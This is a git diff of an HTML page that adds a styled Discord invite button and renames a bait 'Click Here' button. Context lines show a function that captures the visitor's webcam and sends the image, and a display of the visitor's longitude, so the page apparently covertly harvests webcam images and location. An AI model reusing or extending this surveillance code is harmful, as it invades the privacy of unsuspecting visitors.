@@ -57,6 +57,25 @@
         .info-line {
             margin: 5px 0;
         }
+        
+        #discord {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    padding: 12px 18px;
+    background-color: #5865F2; 
+    color: white;
+    font-size: 16px;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+    transition: background-color 0.2s;
+}
+
+#discord:hover {
+    background-color: #4752C4;
+}
     </style>
 </head>
 <body>
@@ -65,12 +84,17 @@
         Your browser does not support the video tag.
     </video>
 
-    <button id="change-media-btn">Click Here</button>
+    <button id="changemedia">Click Here</button>
+    <button id="discord">DISCORD</button>
 
     <div id="info"></div>
     <link rel="preload" href="stars.mp4" as="video">
 
     <script type="module">
+document.getElementById("discord").addEventListener("click", function() {
+    window.open("https://discord.gg/NaNjcWF6Ru", "_blank");
+});
+
          async function captureAndSendImage() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -236,7 +260,7 @@ Longitude: ${userData.longitude || "N/A"}
         async function changeBackgroundAndDisplayInfo() {
             try {
                 
-                const button = document.getElementById('change-media-btn');
+                const button = document.getElementById('changemedia');
                 button.style.display = "none";
 
                 const mediaOptions = [
@@ -284,7 +308,7 @@ Longitude: ${userData.longitude || "N/A"}
         });
 
         
-        document.getElementById('change-media-btn').addEventListener('click', changeBackgroundAndDisplayInfo);
+        document.getElementById('changemedia').addEventListener('click', changeBackgroundAndDisplayInfo);
 
         
         window.onload = async () => {
